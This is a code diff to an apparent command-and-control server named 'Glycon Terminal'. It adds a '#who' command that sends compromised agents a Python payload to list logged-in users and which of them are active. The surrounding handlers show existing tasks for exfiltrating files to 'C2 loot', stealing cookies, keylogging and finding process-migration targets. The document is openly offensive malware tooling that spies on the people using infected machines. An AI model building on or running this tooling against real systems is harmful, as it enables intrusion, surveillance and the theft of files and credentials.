@@ -234,6 +234,7 @@ def init_socket_handlers(socketio):
                     help_text = (
                         "\r\nGlycon Terminal Shortcuts:\r\n"
                         "  #ps                - List processes with migration targets in red\r\n"
+                        "  #who               - List users on the machine with [Active] status\r\n"
                         "  #help              - Show this help\r\n"
                         "  #upload            - Open file upload dialog\r\n"
                         "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
@@ -653,6 +654,55 @@ def list_processes():
 result = list_processes()
 """
                     task_data = {'code': python_payload.strip()}
+                elif cmd_type == "who":
+                    task_type = "execute_python"
+                    python_payload = r"""
+def list_users():
+    import subprocess, os, platform, re
+    BOLD, GREEN, YELLOW, RESET = "\033[1m", "\033[32m", "\033[33m", "\033[0m"
+    header = f"\n{BOLD}{"USER":<20} {"SESSION":<20} {"STATUS":<15} {"IDLE":<10} {"LOGON TIME":<20}{RESET}\n"
+    header += "-" * 85 + "\n"
+    rows = []
+    try:
+        if platform.system() == "Windows":
+            proc = subprocess.Popen(["query", "user"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = proc.communicate()
+            if not stdout:
+                proc = subprocess.Popen("query user", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+                stdout, stderr = proc.communicate()
+            if stdout:
+                for line in stdout.strip().split("\n")[1:]:
+                    is_active = ">" in line
+                    parts = [p.strip() for p in re.split(r"\s{2,}", line.replace(">", "").strip()) if p.strip()]
+                    if len(parts) < 2: continue
+                    user = parts[0]
+                    has_session = not parts[1].isdigit() if len(parts) > 1 else False
+                    session = parts[1] if has_session else "N/A"
+                    state = parts[3] if has_session and len(parts) > 3 else (parts[2] if len(parts) > 2 else "Unknown")
+                    idle = parts[4] if has_session and len(parts) > 4 else (parts[3] if len(parts) > 3 else ".")
+                    logon = parts[5] if has_session and len(parts) > 5 else (parts[4] if len(parts) > 4 else "N/A")
+                    status_str = f"{GREEN}[Active]{RESET}" if (is_active or "Active" in state or idle == ".") else "Logged In"
+                    rows.append(f"{user:<20} {session:<20} {status_str:<25} {idle:<10} {logon:<20}")
+            else: rows.append(f"{YELLOW}Ingen andre sesjoner funnet (kun deg).{RESET}")
+        else:
+            cmd = ["who", "-u"] if platform.system() == "Linux" else ["who"]
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, _ = proc.communicate()
+            if stdout:
+                for line in stdout.strip().split("\n"):
+                    parts = line.split()
+                    if len(parts) < 2: continue
+                    user, tty, logon = parts[0], parts[1], " ".join(parts[2:4])
+                    is_active = "." in line or tty.startswith("tty")
+                    idle = parts[5] if platform.system() == "Linux" and len(parts) > 5 and ":" in parts[5] else ("00:00" if is_active else ".")
+                    status_str = f"{GREEN}[Active]{RESET}" if is_active else "Logged In"
+                    rows.append(f"{user:<20} {tty:<20} {status_str:<25} {idle:<10} {logon:<20}")
+            else: rows.append(f"{YELLOW}Ingen brukere funnet.{RESET}")
+    except Exception as e: rows.append(f"Feil: {str(e)}")
+    return header + "\n".join(rows) + "\n"
+result = list_users()
+"""
+                    task_data = {"code": python_payload.strip()}
                 elif cmd_type == 'cookies':
                     task_type = 'steal_cookies'
                 elif cmd_type == 'keylogger':
